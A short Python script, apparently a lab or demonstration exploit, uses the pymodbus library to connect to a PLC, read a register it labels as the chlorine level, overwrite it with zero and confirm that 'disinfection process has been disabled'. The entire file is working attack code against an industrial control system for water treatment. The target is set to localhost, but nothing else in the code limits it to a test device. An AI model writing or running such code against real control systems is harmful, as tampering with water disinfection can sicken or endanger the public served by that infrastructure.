from pymodbus.client import ModbusTcpClient
import sys
import time

# --- ATTACK CONFIGURATION ---
TARGET_IP = 'localhost' 
TARGET_PORT = 502
TARGET_REGISTER = 19 

def run_exploit():
    print(f"[!] Connecting to Target PLC at {TARGET_IP}:{TARGET_PORT}...")
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    
    if not client.connect():
        print("[-] Connection failed! Is the PLC running?")
        sys.exit(1)

    # 1. Reconnaissance
    print("[*] Reading current Chlorine Level (Register 40021)...")
    
    # FIX: Remove 'slave=1', keep 'count=1'
    rr = client.read_holding_registers(TARGET_REGISTER, count=1)
    
    if rr.isError():
        print(f"[-] Failed to read register: {rr}")
        client.close()
        return
    
    current_val = rr.registers[0]
    print(f"    -> Current Value: {current_val} mg/L")

    # 2. Exploitation
    print(f"[!] EXPLOITING: Sending Modbus Function Code 6 (Write Single Register)...")
    print(f"[!] Overwriting Register {TARGET_REGISTER} with value '0'...")
    
    # FIX: Remove 'slave=1', just pass address and value
    wr = client.write_register(TARGET_REGISTER, 0)
    
    if wr.isError():
        print("[-] Attack blocked or failed.")
    else:
        print("[+] Write packet sent successfully.")

    # 3. Verification
    time.sleep(1)
    print("[*] Verifying new state...")
    
    # FIX: Remove 'slave=1', keep 'count=1'
    rr_after = client.read_holding_registers(TARGET_REGISTER, count=1)
    
    if rr_after.isError():
        print("[-] Read failed during verification.")
    else:
        new_val = rr_after.registers[0]
        if new_val == 0:
            print(f"    -> New Value: {new_val}")
            print("[SUCCESS] Disinfection process has been disabled.")
        else:
            print(f"[-] Value is {new_val}. Attack failed.")

    client.close()

if __name__ == "__main__":
    run_exploit()